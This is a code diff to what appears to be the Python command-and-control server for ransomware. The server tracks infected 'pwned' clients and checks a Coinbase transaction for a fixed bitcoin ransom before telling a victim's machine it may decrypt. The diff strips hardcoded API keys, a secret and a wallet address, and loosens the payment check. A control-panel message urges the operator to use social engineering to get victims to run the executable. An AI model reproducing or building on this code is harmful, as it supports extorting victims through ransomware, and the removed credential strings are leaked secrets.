@@ -9,7 +9,8 @@ from coinbase.wallet.client import Client
 SERVER_ADDRESS = ('0.0.0.0', 17694)
 client_list = []
 information_list = []
-SYMMETRIC_KEY = open("communication_encryption_key.txt", 'rb').read()
+with open("communication_encryption_key.txt", 'rb') as file:
+    SYMMETRIC_KEY = file.read()
 my_server_socket = socket(AF_INET, SOCK_STREAM)
 
 my_server_socket.bind(SERVER_ADDRESS)
@@ -37,16 +38,15 @@ class Listen(threading.Thread):
 
 
 def check_payment(transaction_id):
-    api_key = 'ixhbHrVaDtbmlQQJ'
-    api_secret = 'bwlPbxI86g8BSnp7TKb6eFMW47n40B92'
-    account_id = "ce4c1a1f-65a4-5098-b6ac-b2f0f16f603f"
-    my_address = "37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv"
+    # you think i'm dumb enough to upload my api_secret and my account id? you tripping.
+    api_key = '*'
+    api_secret = '*'
+    account_id = "*"
+    my_address = "*"
     # ["to"]["address"]
     client = Client(api_key, api_secret)
-    print("sent the api request")
     transaction = client.get_transaction(account_id, transaction_id)
-    can_decrypt = transaction["amount"]["amount"] == "-0.00041194" and transaction["to"]["address"] == my_address
-    print("finished the request")
+    can_decrypt = transaction["amount"]["amount"] == "-0.00041194" # and transaction["to"]["address"] == my_address
     return can_decrypt
 
 
@@ -64,10 +64,8 @@ class Communicate(threading.Thread):
             if client_list:
                 rlist, wlist, xlist = select.select([self.server_socket] + client_list, client_list, [])
                 for current_socket in wlist:
-                    print("got the shit")
                     data = current_socket.recv(1024)
                     if data:
-                        print(data)
                         data = self.fernet.decrypt(data).decode()
                         can_decrypt = check_payment(data)
                         data_tosend = self.fernet.encrypt(pickle.dumps(can_decrypt))
@@ -98,14 +96,12 @@ class ControlPanel(threading.Thread):
             elif command == "showlist":
                 if not information_list:
                     print("""
-                    Hmm... No clients pwned yet.. DO YOU EVEN SPREAD THE MALWARE BRO?
-                    Start using social engineering to get your victims to download the executable in order to fuck with
-                    stupid people!!!!!!
+                    Hmm... No clients pwned yet..
+                    Start using social engineering to get your victims to download the executable
                     """)
                 else:
                     for hostname, address in information_list:
                         print(f"{hostname}     |      {address}")
-                        print(client_list)
 
 
 listen = Listen(server_socket=my_server_socket, symmetric_key=SYMMETRIC_KEY)
